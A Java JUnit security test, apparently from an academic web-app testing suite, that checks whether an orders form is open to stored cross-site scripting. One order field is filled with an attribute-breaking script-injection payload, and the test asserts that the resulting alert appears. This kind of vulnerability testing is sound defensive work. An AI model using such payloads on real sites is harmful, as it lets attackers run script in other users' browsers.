package it.unitn.sectest;

import static org.junit.Assert.*;

import org.junit.After;
import org.junit.Test;

import utils.BaseTest;

public class XssOrdersPhp54Min extends BaseTest{

	@Test
	public void test() {
		
		dashboardPage = defaultLogin();

		newOrderPage = dashboardPage.goToNewOrderPage();
		newOrderPage.addOrder("name", "1234", null, null, null, null, null, null, null, "\"/><script>alert(\"due amount\")</script><input type=\"hidden\"");

		ordersPage = newOrderPage.goToOrdersPage();
		waitForWebsite();
		editOrderPage = ordersPage.goToEditOrder();

		editOrderPage.clickAlert();
		assertTrue(editOrderPage.clickAlert());
	}
	


}
